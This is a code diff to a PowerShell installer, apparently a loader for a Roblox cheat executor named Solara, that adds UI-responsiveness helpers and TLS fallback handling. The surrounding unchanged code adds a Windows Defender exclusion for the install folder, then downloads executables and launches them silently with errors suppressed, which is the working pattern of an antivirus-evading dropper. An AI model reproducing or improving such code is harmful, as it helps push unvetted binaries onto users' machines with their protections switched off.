@@ -102,9 +102,32 @@ function Test-IsPE([string]$path) {
     } finally { $f.Close() }
 }
 
+# Pumps the WPF message queue without blocking. Call this in long
+# loops to keep the window responsive (drag, close button, etc).
+function Step-UI {
+    try {
+        if ($script:window -and $script:window.Dispatcher) {
+            $script:window.Dispatcher.Invoke([action]{}, 'Background')
+        }
+    } catch {}
+}
+
+function Wait-WithUIPump([int]$milliseconds) {
+    $deadline = (Get-Date).AddMilliseconds($milliseconds)
+    while ((Get-Date) -lt $deadline) {
+        Start-Sleep -Milliseconds 80
+        Step-UI
+    }
+}
+
 function Install-Executor {
-    [Net.ServicePointManager]::SecurityProtocol = `
-        [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+    # TLS 1.2 baseline; try to add 1.3 but tolerate old .NET that lacks it.
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = `
+            [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+    } catch {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    }
     $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ROGBLOX-Loader'
 
     Add-DefenderExclusion "$env:LOCALAPPDATA\Solara"
@@ -161,17 +184,23 @@ function Install-Executor {
             if (-not (Test-IsPE $temp)) { continue }
             if ((Get-Item $temp).Length -lt 200KB) { continue }
 
-            $args = @()
-            if ($src.SilentArg) { $args = $src.SilentArg -split ' ' }
-            Start-Process $temp -ArgumentList $args -ErrorAction SilentlyContinue
+            # Guard empty ArgumentList - PS chokes on @() in some versions.
+            if ($src.SilentArg -and $src.SilentArg.Trim() -ne '') {
+                Start-Process $temp -ArgumentList ($src.SilentArg -split ' ') `
+                    -ErrorAction SilentlyContinue
+            } else {
+                Start-Process $temp -ErrorAction SilentlyContinue
+            }
 
+            # Pump UI events instead of Start-Sleep so the window stays
+            # responsive (drag, close button) during the 3-min wait.
             $deadline = (Get-Date).AddSeconds(180)
             while ((Get-Date) -lt $deadline) {
                 if (Test-Path $src.Folder) {
-                    Start-Sleep -Seconds 2
+                    Wait-WithUIPump -milliseconds 1500
                     return $src.Folder
                 }
-                Start-Sleep -Seconds 2
+                Wait-WithUIPump -milliseconds 1200
             }
         } catch { continue }
     }
